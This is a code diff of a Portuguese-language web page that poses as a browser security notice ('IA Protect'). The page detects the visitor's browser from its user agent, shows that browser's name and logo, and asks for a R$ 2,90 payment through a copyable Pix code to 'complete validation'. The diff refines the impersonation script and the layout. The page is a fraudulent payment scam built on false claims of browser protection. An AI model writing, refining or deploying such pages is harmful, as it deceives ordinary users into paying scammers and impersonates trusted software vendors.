@@ -13,8 +13,6 @@
       display: flex;
       flex-direction: column;
       align-items: center;
-      justify-content: flex-start;
-      min-height: 100vh;
       padding: 1rem;
       line-height: 1.7;
     }
@@ -22,7 +20,7 @@
     header {
       width: 100%;
       padding: 1rem;
-      background: #ffffff;
+      background: #fff;
       display: flex;
       align-items: center;
       justify-content: center;
@@ -46,12 +44,14 @@
       display: flex;
       justify-content: center;
       align-items: center;
-      margin-bottom: 1.5rem;
       gap: 10px;
+      margin-bottom: 1.5rem;
     }
 
     .icon {
-      height: 38px;
+      height: 40px;
+      width: 40px;
+      object-fit: contain;
       filter: grayscale(100%);
     }
 
@@ -93,7 +93,6 @@
       border: none;
       border-radius: 4px;
       cursor: pointer;
-      transition: background-color 0.3s ease;
     }
 
     .copy-btn:hover {
@@ -117,12 +116,12 @@
 <main>
   <div class="icon-container">
     <img src="https://cdn-icons-png.flaticon.com/512/747/747376.png" alt="cadeado preto" class="icon" />
-    <img id="browser-logo" src="" alt="navegador" class="icon" />
+    <img id="browser-logo" src="https://cdn-icons-png.flaticon.com/512/545/545705.png" alt="Navegador" class="icon" />
   </div>
 
   <h1>Segurança de conexão ativada</h1>
 
-  <p>O navegador <strong id="browser-name">Google Chrome</strong> ativou o protocolo IA Protect — tecnologia baseada em Inteligência Artificial.</p>
+  <p>O navegador <strong id="browser-name">seu navegador</strong> ativou o protocolo IA Protect — tecnologia baseada em Inteligência Artificial.</p>
   <p>Para concluir a validação e garantir estabilidade e proteção durante a navegação, conclua o procedimento:</p>
 
   <p class="highlight">IA Protect operates under $0.55 USD internationally<br>Valor único em Real: <strong>R$ 2,90</strong></p>
@@ -137,30 +136,29 @@
 </main>
 
 <script>
-  // Detecta navegador e define logo + nome
-  const userAgent = navigator.userAgent;
-  let browser = "seu navegador";
-  let logo = "https://cdn-icons-png.flaticon.com/512/545/545705.png";
+  const browserLogo = document.getElementById("browser-logo");
+  const browserName = document.getElementById("browser-name");
+  const ua = navigator.userAgent.toLowerCase();
 
-  if (userAgent.includes("Chrome") && !userAgent.includes("Edg")) {
-    browser = "Google Chrome";
-    logo = "https://cdn-icons-png.flaticon.com/512/732/732228.png";
-  } else if (userAgent.includes("Firefox")) {
-    browser = "Mozilla Firefox";
-    logo = "https://cdn-icons-png.flaticon.com/512/5968/5968710.png";
-  } else if (userAgent.includes("Edg")) {
-    browser = "Microsoft Edge";
-    logo = "https://cdn-icons-png.flaticon.com/512/882/882730.png";
-  } else if (userAgent.includes("Safari") && !userAgent.includes("Chrome")) {
-    browser = "Safari";
-    logo = "https://cdn-icons-png.flaticon.com/512/732/732217.png";
-  } else if (userAgent.includes("Opera") || userAgent.includes("OPR")) {
-    browser = "Opera";
-    logo = "https://cdn-icons-png.flaticon.com/512/5968/5968940.png";
+  if (ua.includes("chrome") && !ua.includes("edg")) {
+    browserName.textContent = "Google Chrome";
+    browserLogo.src = "https://cdn-icons-png.flaticon.com/512/732/732228.png";
+  } else if (ua.includes("firefox")) {
+    browserName.textContent = "Mozilla Firefox";
+    browserLogo.src = "https://cdn-icons-png.flaticon.com/512/5968/5968710.png";
+  } else if (ua.includes("edg")) {
+    browserName.textContent = "Microsoft Edge";
+    browserLogo.src = "https://cdn-icons-png.flaticon.com/512/882/882730.png";
+  } else if (ua.includes("safari") && !ua.includes("chrome")) {
+    browserName.textContent = "Safari";
+    browserLogo.src = "https://cdn-icons-png.flaticon.com/512/732/732217.png";
+  } else if (ua.includes("opera") || ua.includes("opr")) {
+    browserName.textContent = "Opera";
+    browserLogo.src = "https://cdn-icons-png.flaticon.com/512/5968/5968940.png";
+  } else {
+    browserName.textContent = "seu navegador";
+    browserLogo.src = "https://cdn-icons-png.flaticon.com/512/545/545705.png";
   }
-
-  document.getElementById("browser-name").textContent = browser;
-  document.getElementById("browser-logo").src = logo;
 
   function copyPix() {
     const pixText = document.getElementById("pix-code").innerText;
